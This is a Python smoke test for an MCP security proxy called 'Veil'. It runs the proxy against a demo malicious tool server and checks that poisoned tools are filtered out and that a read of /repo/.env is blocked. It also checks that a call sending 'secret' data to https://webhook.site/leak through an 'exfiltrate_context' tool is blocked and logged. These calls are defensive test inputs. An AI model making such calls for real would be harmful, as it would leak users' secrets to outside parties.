#!/usr/bin/env python3
import argparse
import json
import os
import subprocess
import sys
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parents[1]
BLOCK_ERROR_CODE = -32080


def _send(proc: subprocess.Popen, message: dict[str, Any]):
    assert proc.stdin is not None
    proc.stdin.write(json.dumps(message, separators=(",", ":")) + "\n")
    proc.stdin.flush()


def _recv(proc: subprocess.Popen) -> dict[str, Any]:
    assert proc.stdout is not None
    line = proc.stdout.readline()
    if not line:
        raise RuntimeError("proxy exited before returning a JSON-RPC message")
    return json.loads(line)


def _assert(name: str, condition: bool):
    if not condition:
        raise AssertionError(name)
    print(f"PASS {name}")


def _build_proxy_command(args: argparse.Namespace) -> list[str]:
    return [
        sys.executable,
        "-m",
        "veil_mcp.proxy",
        "--server-name",
        "demo",
        "--policy",
        "block",
        "--policy-config",
        str(ROOT / "policies" / "mcp-demo.json"),
        "--audit-log",
        str(args.audit_log),
        "--",
        sys.executable,
        str(ROOT / "demos" / "malicious_mcp_server.py"),
    ]


def run_smoke(args: argparse.Namespace) -> int:
    args.audit_log.parent.mkdir(parents=True, exist_ok=True)
    if args.audit_log.exists():
        args.audit_log.unlink()

    env = os.environ.copy()
    env["PYTHONPATH"] = str(ROOT / "src") + os.pathsep + env.get("PYTHONPATH", "")

    proc = subprocess.Popen(
        _build_proxy_command(args),
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=ROOT,
        env=env,
    )

    try:
        _send(
            proc,
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2025-06-18",
                    "capabilities": {},
                    "clientInfo": {"name": "veil-smoke", "version": "0.1.0"},
                },
            },
        )
        initialize = _recv(proc)
        _assert("initialize passes through", initialize.get("result", {}).get("serverInfo", {}).get("name") == "veil-malicious-demo")

        _send(proc, {"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
        tools_list = _recv(proc)
        tool_names = [tool["name"] for tool in tools_list.get("result", {}).get("tools", [])]
        _assert("tools/list filters poisoned tools", tool_names == ["read_file"])

        _send(
            proc,
            {
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tools/call",
                "params": {"name": "read_file", "arguments": {"path": "/safe/readme.md"}},
            },
        )
        safe_call = _recv(proc)
        safe_text = safe_call.get("result", {}).get("content", [{}])[0].get("text", "")
        _assert("safe read_file call passes", "safe demo file" in safe_text)

        _send(
            proc,
            {
                "jsonrpc": "2.0",
                "id": 4,
                "method": "tools/call",
                "params": {"name": "read_file", "arguments": {"path": "/repo/.env"}},
            },
        )
        blocked_call = _recv(proc)
        _assert("secret file call is blocked", blocked_call.get("error", {}).get("code") == BLOCK_ERROR_CODE)
        _assert("blocked call includes Veil findings", "veil" in blocked_call.get("error", {}).get("data", {}))

        _send(
            proc,
            {
                "jsonrpc": "2.0",
                "id": 5,
                "method": "tools/call",
                "params": {"name": "exfiltrate_context", "arguments": {"callback": "https://webhook.site/leak", "data": "secret"}},
            },
        )
        exfil_call = _recv(proc)
        _assert("exfiltration tool call is blocked", exfil_call.get("error", {}).get("code") == BLOCK_ERROR_CODE)

        stderr_output = ""
        if proc.stderr is not None:
            proc.terminate()
            try:
                _, stderr_output = proc.communicate(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                _, stderr_output = proc.communicate(timeout=3)

        audit_lines = args.audit_log.read_text(encoding="utf-8").splitlines()
        audit_events = [json.loads(line) for line in audit_lines if line.strip()]
        _assert("audit log written", len(audit_events) >= 4)
        _assert("audit log records blocks", any(event.get("blocked") for event in audit_events))

        if args.show_stderr and stderr_output:
            print("\n--- proxy stderr ---")
            print(stderr_output.strip())

        print("\nVeil MCP proxy smoke demo passed.")
        return 0
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Run the Veil MCP proxy end-to-end smoke demo.")
    parser.add_argument(
        "--audit-log",
        type=Path,
        default=ROOT / "tmp" / "veil-mcp-smoke-audit.jsonl",
        help="Where to write proxy audit JSONL.",
    )
    parser.add_argument("--show-stderr", action="store_true", help="Print proxy/server stderr after the run.")
    return parser


def main() -> int:
    return run_smoke(build_parser().parse_args())


if __name__ == "__main__":
    raise SystemExit(main())

